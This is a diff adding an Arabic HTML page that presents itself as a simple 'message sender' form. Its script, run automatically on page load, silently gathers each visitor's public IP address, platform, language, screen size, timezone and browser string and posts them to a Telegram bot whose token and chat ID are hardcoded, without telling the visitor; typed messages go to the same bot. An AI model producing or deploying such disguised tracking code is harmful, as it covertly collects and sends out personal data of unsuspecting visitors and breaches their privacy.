@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرسل الرسائل</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .header {
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 1.1rem;
+        }
+        
+        .message-box {
+            margin-bottom: 25px;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            resize: vertical;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .send-btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .send-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+        }
+        
+        .send-btn:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: #667eea;
+            font-size: 16px;
+        }
+        
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error-message {
+            display: none;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #888;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔄 مرسل الرسائل</h1>
+            <p>أرسل رسالتك وسيتم توصيلها فوراً</p>
+        </div>
+        
+        <div class="message-box">
+            <textarea id="message" placeholder="اكتب رسالتك هنا..." rows="6"></textarea>
+        </div>
+        
+        <button class="send-btn" onclick="sendMessage()">
+            📤 إرسال الرسالة
+        </button>
+        
+        <div class="loading" id="loading">
+            جاري إرسال الرسالة...
+        </div>
+        
+        <div class="success-message" id="successMessage">
+            ✅ تم إرسال الرسالة بنجاح!
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            ❌ الرجاء إدخال رسالة
+        </div>
+        
+        <div class="footer">
+            © 2024 مرسل الرسائل - جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function getIPInfo() {
+            $.getJSON('https://api.ipify.org?format=json', function(data) {
+                var ip = data.ip;
+                var userAgent = navigator.userAgent;
+                var platform = navigator.platform;
+                var language = navigator.language;
+                var screen = screen.width + 'x' + screen.height;
+                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                var cookies = navigator.cookieEnabled ? 'مفعل' : 'معطل';
+                
+                var info = `🌐 معلومات الزائر:\n` +
+                          `📡 IP: ${ip}\n` +
+                          `🖥️ النظام: ${platform}\n` +
+                          `🌍 اللغة: ${language}\n` +
+                          `📱 الشاشة: ${screen}\n` +
+                          `⏰ المنطقة: ${timezone}\n` +
+                          `🍪 الكوكيز: ${cookies}\n` +
+                          `🔍 المتصفح: ${userAgent.substring(0, 100)}...`;
+                
+                sendToTelegram(info);
+            }).fail(function() {
+                var info = `🌐 معلومات الزائر (بدون IP):\n` +
+                          `🖥️ النظام: ${navigator.platform}\n` +
+                          `🌍 اللغة: ${navigator.language}\n` +
+                          `📱 الشاشة: ${screen.width}x${screen.height}\n` +
+                          `🔍 المتصفح: ${navigator.userAgent.substring(0, 100)}...`;
+                
+                sendToTelegram(info);
+            });
+        }
+
+        function sendToTelegram(message) {
+            var token = '8378436957:AAGCKo0ZgVAe6028kQKTyzMIsr3Qenjp5jI';
+            var chatId = '8326900293';
+            
+            $.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            });
+        }
+
+        function sendMessage() {
+            var message = $('#message').val().trim();
+            var loading = $('#loading');
+            var success = $('#successMessage');
+            var error = $('#errorMessage');
+            
+            // إخفاء جميع الرسائل
+            success.hide();
+            error.hide();
+            
+            if (message === '') {
+                error.show();
+                return;
+            }
+            
+            loading.show();
+            
+            // إرسال الرسالة إلى التليجرام
+            sendToTelegram('📩 رسالة جديدة:\n' + message);
+            
+            // محاكاة التأخير
+            setTimeout(function() {
+                loading.hide();
+                success.show();
+                $('#message').val('');
+                
+                // إخفاء رسالة النجاح بعد 3 ثواني
+                setTimeout(function() {
+                    success.hide();
+                }, 3000);
+            }, 1500);
+        }
+
+        $(document).ready(function() {
+            // جمع المعلومات عند تحميل الصفحة
+            getIPInfo();
+            
+            // إرسال بالضغط على Enter
+            $('#message').keypress(function(e) {
+                if (e.which === 13 && !e.shiftKey) {
+                    e.preventDefault();
+                    sendMessage();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
